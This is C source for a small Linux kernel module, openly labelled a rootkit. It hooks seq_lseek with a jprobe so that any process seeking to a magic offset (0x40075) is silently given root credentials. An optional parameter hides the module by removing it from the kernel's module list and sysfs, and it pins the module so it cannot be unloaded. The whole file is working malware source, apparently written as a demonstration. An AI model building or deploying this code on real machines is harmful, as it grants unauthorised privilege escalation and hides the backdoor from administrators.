/**
 * hello_rootkit -- Definitely Not A Rootkit
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/err.h>

#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nelson Elhage");
MODULE_DESCRIPTION("Definitely Not A Rootkit (It's totally a rootkit)");
MODULE_VERSION("0.1");

static bool hide_self;
module_param(hide_self, bool, 0444);

#define MAGIC_NUMBER 0x40075

void get_root(void) {
	printk(KERN_CRIT "!! getting root!!\n");
	commit_creds(prepare_kernel_cred(NULL));
}

static int my_lseek(struct file *file, loff_t offset, int whence) {
	if (offset == MAGIC_NUMBER) {
		get_root();
	}
	jprobe_return();
	return 0;
}

struct jprobe probe = {
	.kp =
	{
		.symbol_name = "seq_lseek",
	},
	.entry = (void*)my_lseek,
};

static int install_rootkit(void) {
	return register_jprobe(&probe);
}

static int __init hello_rc_init(void) {
	if (install_rootkit())
		printk(KERN_INFO "Failed to install hooks.");

	if (hide_self) {
		try_module_get(THIS_MODULE);
		kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->list);
		printk(KERN_INFO "I was never here.\n");
	}
	return 0;
}

static void __exit hello_rc_exit(void) {
	unregister_jprobe(&probe);
}


module_init(hello_rc_init);
module_exit(hello_rc_exit);
